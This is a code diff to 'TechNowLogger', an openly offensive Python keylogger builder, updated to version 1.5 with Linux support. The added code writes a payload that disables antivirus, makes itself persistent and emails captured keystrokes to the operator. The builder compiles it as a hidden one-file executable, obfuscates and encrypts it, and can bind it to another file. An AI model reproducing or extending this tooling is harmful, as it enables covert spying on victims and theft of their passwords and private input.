@@ -13,10 +13,10 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 if platform.system() == 'Windows':
     WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
 elif platform.system() == 'Linux':
-    WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37/Scripts/pyinstaller.exe")
+    WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.4')
+    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.5')
     parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
@@ -35,7 +35,9 @@ def get_arguments():
 def check_dependencies():
     print(f"{YELLOW}\n[*] Checking Dependencies...")
     try:
-        import mss, essential_generators, PyInstaller, pynput, six, win32gui
+        import mss, essential_generators, PyInstaller, pynput, six
+        if platform.system() == 'Windows':
+            import win32gui
         print(f"{GREEN}[+] All Dependencies are Installed on this system ;)\n")
     except Exception as e:
         print(f"[!] Error : {e}")
@@ -50,10 +52,17 @@ def check_dependencies():
                 pip.main(['install', 'pynput==1.4.4'])
                 pip.main(['install', 'six==1.12.0']) 
                 pip.main(['install', 'python-xlib==0.25'])
-                pip.main(['install', 'win32gui'])
+                if platform.system() == 'Windows':
+                    pip.main(['install', 'win32gui'])
                 print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
-                print(f"{GREEN}\n[+] Dependencies installed correctly ;)\n")
+                print(f"{GREEN}\n[+] Dependencies installed successfully ;)\n")
                 break
+                
+        except AttributeError:
+            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")        
+            print(f"{RED}\n[!] Try Running This command : python3 -m pip install --user --upgrade pip==9.0.3\n")
+            quit()
+        
         except:
             print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")
             quit()
@@ -104,7 +113,16 @@ def create_keylogger_binded(file_name, interval, email, password, time_persisten
         file.write("\t\ttechnowlogger.kill_av()\n")        
         file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
         file.write("\t\ttechnowlogger.start()\n\n")            
-        file.write("check_and_start()\n")            
+        file.write("check_and_start()\n") 
+
+def create_keylogger_linux(file_name, interval, email, password, time_persistent):
+    with open(file_name, "w+") as file:
+        file.write("import keylogger\n")
+
+        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
+        file.write("technowlogger.kill_av()\n")        
+        file.write(f"technowlogger.become_persistent({time_persistent})\n")
+        file.write("technowlogger.start()\n")     
         
 def obfuscating_payload(file_name):
     gen = DocumentGenerator()
@@ -119,19 +137,24 @@ def compile_for_windows_binded(file_name, icon_path):
     subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
 
 def compile_for_linux(file_name, icon_path):
-    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
+    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def del_junk_file(file_name):
     try:
-        build = os.getcwd() + "\\build"
-        file_name = os.getcwd() + f"\\{file_name}"
-        pycache = os.getcwd() + "\\__pycache__"
-        os.remove(file_name)
-        os.remove(file_name + ".spec")    
-        shutil.rmtree(build)
-        shutil.rmtree(pycache)
+        if platform.system() == 'Windows':        
+            build = os.getcwd() + "\\build"
+            file_name = os.getcwd() + f"\\{file_name}"
+            pycache = os.getcwd() + "\\__pycache__"
+            os.remove(file_name)
+            os.remove(file_name + ".spec")    
+            shutil.rmtree(build)
+            shutil.rmtree(pycache)
+        if platform.system() == 'Linux':   
+            file_spec = file_name + ".spec"
+            os.system(f"rm -r build/ __pycache__/ {file_spec} {file_name}")                    
     except Exception:
         pass
+
 
 def exit_greet():
     try:
@@ -185,10 +208,14 @@ if __name__ == '__main__':
 
         print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")
 
-        if arguments.bind == '' or arguments.bind == None:
-            create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
+        if arguments.windows:
+            if arguments.bind == '' or arguments.bind == None:
+                create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
+            else:
+                create_keylogger_binded(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.bind.split("\\")[-1])            
         else:
-            create_keylogger_binded(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.bind.split("\\")[-1])            
+            create_keylogger_linux(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))            
+        
         obfuscating_payload(arguments.out)
         
         encrypting_code = encrypt_code.Encrypt()
@@ -212,7 +239,7 @@ if __name__ == '__main__':
         del_junk_file(arguments.out)
         print(f"{GREEN}[+] Junk Files Removed Successfully!")
         
-        if os.path.exists(f'dist/{arguments.out}.exe'):
+        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}'):
             print(f"\n{GREEN}[+] Generated Successfully!\n")           
             print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
             print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
@@ -225,6 +252,4 @@ if __name__ == '__main__':
     except KeyboardInterrupt:        
         exit_greet()
         
-    except Exception as e:
-        print(f"\n{RED}[!] Error : {e}")
         
